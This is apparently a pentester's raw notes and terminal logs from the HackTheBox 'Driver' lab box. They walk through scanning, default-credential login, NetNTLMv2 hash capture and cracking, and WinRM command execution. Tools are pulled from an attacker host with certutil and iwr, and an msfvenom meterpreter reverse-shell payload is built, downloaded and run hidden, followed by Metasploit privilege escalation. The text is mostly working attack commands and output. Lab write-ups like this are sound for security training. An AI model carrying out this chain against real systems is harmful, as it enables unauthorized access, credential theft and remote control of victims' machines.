
```
ares@legion:~$ sudo nmap -sV -A -T4 $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-08 21:20 EET
Nmap scan report for 10.10.11.106 (10.10.11.106)
Host is up (0.077s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc        Microsoft Windows RPC
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows 10 1607 (89%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows 11 (86%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows Vista or Windows 7 (86%), Microsoft Windows Server 2008 R2 or Windows 7 SP1 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-11-09T02:20:26
|_  start_date: 2025-11-09T02:14:22
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   78.26 ms 10.10.14.1 (10.10.14.1)
2   78.53 ms 10.10.11.106 (10.10.11.106)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.48 seconds

```

```
ares@legion:~$ curl -v http://$target 2>&1                                                                                                                                    
*   Trying 10.10.11.106:80...
* Connected to 10.10.11.106 (10.10.11.106) port 80
* using HTTP/1.x
> GET / HTTP/1.1
> Host: 10.10.11.106
> User-Agent: curl/8.15.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 401 Unauthorized
< Content-Type: text/html; charset=UTF-8
< Server: Microsoft-IIS/10.0
< X-Powered-By: PHP/7.3.25
< WWW-Authenticate: Basic realm="MFP Firmware Update Center. Please enter password for admin"
< Date: Sun, 09 Nov 2025 02:22:33 GMT
< Content-Length: 20
< 

* Connection #0 to host 10.10.11.106 left intact
Invalid Credentials   
```
admin:admin

upload revshell.php failed
http://10.10.11.106/fw_up.php?msg=SUCCESS // payloads for url failed
![[Pasted image 20251108212626.png]]

![[Pasted image 20251108212638.png]]

https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/
![[Pasted image 20251108215138.png]]

```
ares@legion:~/HackTheBox/Driver$ hashid hash                                           
--File 'hash'--
Analyzing 'tony::DRIVER:aaaaaaaaaaaaaaaa:65f80c314a5eaee99e365b20b266595c:0101000000000000802e47e3e850dc01cf76c820b582908000000000010010007400480077005900560066007400760003001000740048007700590056006600740076000200100047006d004900720041004a00630079000400100047006d004900720041004a006300790007000800802e47e3e850dc010600040002000000080030003000000000000000000000000020000008c65fd18f1254d420738fb9a48c75cbfa10789f8b75898774d6d0bd69db57210a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0032003400000000000000000000000000'
[+] NetNTLMv2 
--End of file 'hash'--               
```
tony:liltony 

```
crackmapexec winrm 10.10.11.106 -u tony -p liltony -x "dir C:\Users\tony\Desktop"
SMB         10.10.11.106    5985   DRIVER           [*] Windows 10 Build 10240 (name:DRIVER) (domain:DRIVER)
HTTP        10.10.11.106    5985   DRIVER           [*] http://10.10.11.106:5985/wsman
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.11.106    5985   DRIVER           [+] DRIVER\tony:liltony (Pwn3d!)
WINRM       10.10.11.106    5985   DRIVER           [+] Executed command
WINRM       10.10.11.106    5985   DRIVER           

    Directory: C:\Users\tony\Desktop                                                       
Mode                LastWriteTime         Length Name                                        
-ar---        11/8/2025   6:15 PM             34 user.txt                                                                                                                                 
 crackmapexec winrm 10.10.11.106 -u tony -p liltony -x "whoami /priv"
SMB         10.10.11.106    5985   DRIVER           [*] Windows 10 Build 10240 (name:DRIVER) (domain:DRIVER)
HTTP        10.10.11.106    5985   DRIVER           [*] http://10.10.11.106:5985/wsman
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.11.106    5985   DRIVER           [+] DRIVER\tony:liltony (Pwn3d!)
WINRM       10.10.11.106    5985   DRIVER           [+] Executed command
WINRM       10.10.11.106    5985   DRIVER           
PRIVILEGES INFORMATION                                                                                                                                                                          
Privilege Name                Description                          State                     
============================= ==================================== =======
SeShutdownPrivilege           Shut down the system                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
SeTimeZonePrivilege           Change the time zone                 Enabled

ares@legion:~/HackTheBox/Driver$ impacket-smbserver -smb2support share /usr/share/peass/winpeas/
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```

Transfer & run winpeas
Methods
```
 crackmapexec winrm 10.10.11.106 -u tony -p liltony -x "copy \\10.10.14.24\share\winPEASany.exe C:\Users\tony\Desktop\winpeas.exe"
```
 
```
 crackmapexec winrm 10.10.11.106 -u tony -p liltony -x "certutil -urlcache -split -f http://10.10.14.24:8000/winPEASany.exe C:\Users\tony\Desktop\winpeas.exe"
```

```
 crackmapexec winrm 10.10.11.106 -u tony -p liltony -x "powershell -c iwr -uri http://10.10.14.24:8000/winPEAS.exe -outfile C:\Users\tony\Desktop\winpeas.exe"
```

Check transfer
```
crackmapexec winrm 10.10.11.106 -u tony -p liltony -x "dir C:\Users\tony\Desktop"
```

No ouput from Winpeas
```
crackmapexec winrm 10.10.11.106 -u tony -p liltony -x "\\10.10.14.24\share\winPEASany.exe"
```

Read winpeas and Console_history.txt
```
 crackmapexec winrm 10.10.11.106 -u tony -p liltony -x "C:\Users\tony\Desktop\winpeas.exe > C:\Users\tony\Desktop\output.txt 2>&1"
 
 crackmapexec winrm 10.10.11.106 -u tony -p liltony -x "type C:\Users\tony\Desktop\output.txt"

crackmapexec winrm 10.10.11.106 -u tony -p liltony -x "type C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Stageless msfvenom payload:
```
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.27 LPORT=4444 -f exe -o shell2.exe
```

```
crackmapexec winrm 10.10.11.106 -u tony -p liltony -x "certutil -urlcache -split -f http://10.10.14.27:8000/shell2.exe C:\Users\tony\Desktop\shell2.exe"
```

```
bundle exec evil-winrm.rb -i 10.10.11.106 -u tony -p 'liltony'

*Evil-WinRM* PS C:\Users\tony\Desktop> Start-Process .\shell2.exe -WindowStyle Hidden
```

 Privesc
```
use multi/recon/local_exploit_suggester
```

```
set payload windows/x64/meterpreter/reverse_tcp 
set session 1 
set lhost tun0 
run
```

